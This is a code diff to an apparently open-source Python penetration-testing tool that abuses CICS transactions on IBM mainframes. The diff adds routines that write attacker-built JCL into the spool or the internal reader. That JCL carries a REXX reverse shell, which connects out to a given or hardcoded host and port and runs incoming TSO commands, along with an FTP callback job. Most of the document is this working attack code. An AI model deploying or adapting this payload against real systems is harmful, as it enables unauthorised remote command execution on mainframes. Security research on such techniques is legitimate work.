@@ -24,12 +24,14 @@ import argparse
 # Refer to https://github.com/ayoul3                                   
 # Requirements for JCL submission :
 #        SPOOL=YES in SIT table
-#        or TDQueue pointing to INTRDR (which was defined in CICS start up JCL)
-#                                                                       
+#        Or TDQueue pointing to INTRDR (which was defined in CICS start up JCL)
+#        Record length of the JCL must not exceed 80 characters 
+#                                                              
 # Created by: Ayoul3 (@ayoul3__              	
 # Credit for the reverse shell goes to @mainframed767 (https://github.com/mainframed)
 # Copyright GPL 2016                                             	  
 #####################################################################################
+
 
 TRAN_NUMBER = 1000
 SLEEP = 0.5
@@ -67,12 +69,42 @@ class bcolors:
 
 def sleep():
   time.sleep(SLEEP)
-  
+
 def signal_handler(signal, frame):
         print 'Done !'
         sys.exit(0)
 
-
+def printProgress (iteration, total, prefix = '', suffix = '', decimals = 1, barLength = 100):
+    """
+    Call in a loop to create terminal progress bar
+    @params:
+        iteration   - Required  : current iteration (Int)
+        total       - Required  : total iterations (Int)
+        prefix      - Optional  : prefix string (Str)
+        suffix      - Optional  : suffix string (Str)
+        decimals    - Optional  : positive number of decimals in percent complete (Int)
+        barLength   - Optional  : character length of bar (Int)
+    """
+    formatStr       = "{0:." + str(decimals) + "f}"
+    percents        = formatStr.format(100 * (iteration / float(total)))
+    filledLength    = int(round(barLength * iteration / float(total)))
+    bar             = '*' * filledLength + ' ' * (barLength - filledLength)
+    #bar             = '█' * filledLength + '-' * (barLength - filledLength)
+    sys.stdout.write('\r\t%s|%s| %s%s %s' % (prefix, bar, percents, '%', suffix)),
+    sys.stdout.flush()
+    if iteration == total:
+        sys.stdout.write('\n')
+        sys.stdout.flush()
+          
+def rand_name(size=8, chars=string.ascii_letters):
+	return ''.join(random.choice(chars) for x in range( 1, size ))
+  
+def format_request(request):
+    i =0;
+    while i + len(request) < 80:
+       request +=request +" "
+    
+    return request
 def show_screen():
     data = em.screen_get();
     for d in data:
@@ -610,15 +642,12 @@ def get_file_content():
        next_ridfld = format(int(next_ridfld)+1, "0"+str(keylength))
          
 
-def rand_name(size=8, chars=string.ascii_letters):
-	return ''.join(random.choice(chars) for x in range( 1, size ))
-
 def dummy_jcl(lhost):
     
     if results.surrogat_user:
-      job_card = '//CICSUSER JOB (INTRDR),USER='+results.surrogat_user+',CLASS=A'      
+      job_card = '//CICSUSEA JOB (INTRDR),USER='+results.surrogat_user+',CLASS=A'      
     else:
-      job_card = '//CICSUSER JOB (INTRDR),CLASS=A'
+      job_card = '//CICSUSEA JOB (INTRDR),CLASS=A'
       
     dummy_jcl = job_card+'''
 //*
@@ -629,90 +658,88 @@ def dummy_jcl(lhost):
 /*
 //SYSIN    DD  DUMMY
 /*EOF'''
-    return dummy_jcl    
+    return dummy_jcl 
+       
+def dummy_jcl2(lhost):
+    dummy = {}
+    dummy[0] = '//CICSUSER JOB (INTRD1),CLASS=A'
+    dummy[1]= '//*'
+    dummy[2] = '//STEP01 EXEC  PGM=IKJEFT01'
+    dummy[3] = '//SYSTSPRT DD  SYSOUT=*'
+    dummy[4] = '//SYSTSIN  DD *'
+    dummy[5] = 'FTP '+lhost.split(":")[0]+' '+lhost.split(":")[1]
+    dummy[6] = '/*'
+    dummy[7] = '//SYSIN    DD  DUMMY'
+    dummy[8] = '/*EOF'
     
-def reverse_jcl(lhost, username="CICSUSER"):
+    
+        
+    for key in dummy:
+      i = 0;
+      while i < (80 - len(dummy[key])):
+         dummy[key] = dummy[key] + str(" ")
+    
+    jcl = ""
+    for key in dummy:
+        jcl += dummy[key]
+    
+    return jcl
+    
+def reverse_jcl(lhost, username="CICSUSEB"):
 	
 	job_name = username
-	rexx_file = rand_name(randrange(3,6))
-	source_file = rand_name(randrange(3,6))
-	exec_file = rand_name(randrange(3,6))
-
+	tmp = rand_name(randrange(3,7))
+	
+  
 	jcl_code = "//"+job_name.upper()+" JOB ("+"123456768"+"""),CLASS=A
-//*
-//EXIST2  EXEC PGM=IDCAMS
-//SYSPRINT DD  SYSOUT=*
-//SYSIN    DD  *
- LISTC ENT('CICSUSER.REV5')
- IF LASTCC = 0 THEN DELETE 'CICSUSER.REV5'
-/*
 //CREATERX  EXEC PGM=IEBGENER
 //SYSPRINT   DD SYSOUT=*
 //SYSIN      DD DUMMY
-//SYSUT2     DD DSN=CICSUSER.REV5,
+//SYSUT2     DD DSN=CICSUSER."""+tmp+""",
 //           DISP=(NEW,CATLG,DELETE),SPACE=(TRK,5),
 //           DCB=(RECFM=FB,LRECL=80,BLKSIZE=27920)
 //SYSUT1     DD *
-  /* REXX */ 
- /* nl ='25'x;reverse('213.152.162.84','60738');exit */
-   nl ='25'x;reverse('"""+lhost.split(":")[0]+"""','"""+lhost.split(":")[1]+"""');exit
+  /* REXX */ nl ='25'x;reverse('192.168.1.16','4445');exit
  reverse:
- PARSE ARG rhost,  rport
-    t=SOCKET('INITIALIZE','CLIENT',2);
-    t=SOCKET('SOCKET',2,'STREAM','TCP');
-    parse var t socket_rc s . ;
-    if socket_rc <> 0 then do
+ PARSE ARG rh,  rp
+    t=SOCKET('INITIALIZE','CLIENT',2);t=SOCKET('SOCKET',2,'STREAM','TCP');
+    parse var t socket_rc s . ; if socket_rc <> 0 then do
        t= SOCKET('TERMINATE');exit 1;end
-       par1='SOL_SOCKET';
-t=Socket('SETSOCKOPT',s,par1,'SO_KEEPALIVE','ON')
-t=SOCKET('SETSOCKOPT',s,par1,'SO_ASCII','On')
-    t=SOCKET('SOCKETSETSTATUS','CLIENT')
-    t=SOCKET('CONNECT',s,'AF_INET' rport rhost)
-    t= SOCKET('SEND',s, 'Shell> ')
+       par1='SOL_SOCKET';t=Socket('SETSOCKOPT',s,par1,'SO_KEEPALIVE','ON')
+    t=SOCKET('SETSOCKOPT',s,par1,'SO_ASCII','On')
+    t=SOCKET('SOCKETSETSTATUS','CLIENT');
+    t=SOCKET('CONNECT',s,'AF_INET' rp rh); t= SOCKET('SEND',s, 'Shell> ')
   DO FOREVER
-g_cmd = get_cmd(s);parse = exec_cmd(s,g_cmd);end
-return 0
- close_socket:
-    parse arg exito .
-    te = SOCKET('CLOSE',s); exit;return 0
+    g_cmd = get_cmd(s);parse = exec_cmd(s,g_cmd);end;return 0
  get_cmd:
- parse arg socket_to_use
-    sox = SOCKET('RECV',socket_to_use,10000);
-    parse var sox s_rc s_type s_port s_ip s_results;
+    parse arg socket_to_use; sox = SOCKET('RECV',socket_to_use,10000);
     parse var sox s_rc s_data_len s_data_text;
-    if s_rc <> 0 then do CALL close_socket(1);end
-c = DELSTR(s_data_text,LENGTH(s_data_text));return c;
+    c = DELSTR(s_data_text,LENGTH(s_data_text));return c;
   INLIST: procedure
-     arg sock, socklist; do i=1 to words(socklist)
+    arg sock, socklist; do i=1 to words(socklist)
     if words(socklist) = 0 then return 0
-if sock = word(socklist,i) then return 1;end;return 0
- current_user:
-   text = nl||'userID: '||userid()||nl; return text
+    if sock = word(socklist,i) then return 1;end;return 0
  exec_tso:
-   parse arg tso_do
-   text = nl||'Issuing TSO Command: '||tso_do||nl
+   parse arg tso_do; text = nl||'Issuing TSO Command: '||tso_do||nl
    u = OUTTRAP('tso_out.'); ADDRESS TSO tso_do;
    u = OUTTRAP(OFF);DO i = 1 to tso_out.0
       text = text||tso_out.i||nl;end;return text
  exec_cmd:
  parse arg sockID, do_it; parse var do_it do_it do_co
  SELECT
-  WHEN translate(do_it) = 'GETUID' THEN DO
-    te=SOCKET('SEND',sockID, current_user()||nl);end
   WHEN translate(do_it) = 'TSO' THEN do
    t=SOCKET('SEND',sockID, exec_tso(do_co)||nl);end
-  WHEN translate(do_it) = 'EXIT' THEN DO
-    call close_socket '1';exit;end;end
  te = SOCKET('SEND',sockID, 'Shell> ');return 1;
 /*
 //SYSOUT     DD SYSOUT=*
 //STEP01 EXEC  PGM=IKJEFT01
 //SYSTSPRT DD  SYSOUT=*
 //SYSTSIN  DD *
- EX 'CICSUSER.REV5'
+ EX 'CICSUSER."""+tmp+"""'
 /*
 //SYSIN    DD  DUMMY
-/*EOF"""
+/*EOF
+"""
 	return jcl_code
 
 def set_mixedCase(em):
@@ -793,11 +820,18 @@ def spool_write(token, jcl):
         em.safe_send(request);
         em.send_enter();
         #sleep()
-        
-               
-        em.move_to(7,24)
-        em.safe_send(j);        
+        em.move_to(7,2)
         em.send_enter();
+        k= 0;
+        while k < len(j):
+          em.move_to((k/64)+3,11)
+          em.safe_send(j[k:k+64]);
+          k+=64
+        em.send_enter
+        
+        #em.move_to(7,24)
+        #em.safe_send(j);        
+        #em.send_enter();
         #sleep()
         
         
@@ -812,11 +846,60 @@ def spool_write(token, jcl):
         #show_screen();  
         
         i += 1
+
+        if i <= total:
+          printProgress(i, total, prefix = '', suffix = 'Complete', barLength = 30)
+                
         data = em.screen_get();
         if "RESPONSE: NORMAL" not in data[22]:
             whine('Received error while writing JCL ('+str(i)+'):\n'+data[22],'err')
             sys.exit();
-       
+ 
+    whine('JCL Written successfully to the spool','good',1)   
+    return 0
+
+def spool_write2(token, jcl):
+    whine('Writting JCL to the spool (might take a few seconds)','info')      
+    
+    # write each line in a variable
+    i = 0;
+    total = len(jcl)
+    
+    em.send_pf5()
+    em.move_to(7,2)
+    em.send_eraseEOF()
+    em.send_enter();
+    
+    request = "&sqlkhds  "+str(total)
+    em.safe_send(request);    
+    em.send_enter();
+    
+    em.move_to(7,2)
+    em.send_enter();
+    
+    # large screen of variable
+    
+    while i < len(jcl):
+        em.move_to((i/64)+3,11)
+        em.safe_send(jcl[i:i+64]);
+        i+=64
+    
+   
+    em.send_enter();    
+    
+    em.send_enter();
+    em.move_to(1,2)
+    request = 'SPOOLWRITE TOKEN(&TOKTEST) FROM(&SQLKHDS) FLENGTH('+str(total)+')                                '
+    em.safe_send(request);
+    em.send_enter();  
+    em.send_enter();
+    
+    show_screen();
+    data = em.screen_get();
+    if "RESPONSE: NORMAL" not in data[22]:
+        whine('Received error while writing JCL ('+str(i)+'):\n'+data[22],'err')
+        sys.exit();
+   
     whine('JCL Written successfully to the spool','good',1)   
     return 0
 
@@ -856,6 +939,7 @@ def write_tdqueue(jcl):
     
     whine('Writing to the internal reader','info')
     i = 0;
+    total = jcl.count('\n')
     for j in jcl.split("\n"):        
         # Go the variable screen
         em.send_pf5()
@@ -888,6 +972,9 @@ def write_tdqueue(jcl):
         #show_screen();  
         
         i += 1
+        if i <= total:
+          printProgress(i, total, prefix = '', suffix = 'Complete', barLength = 30)
+          
         data = em.screen_get();
         if "RESPONSE: NORMAL" not in data[22]:
             whine('Received error while writing JCL ('+str(i)+'):\n'+data[22],'err')
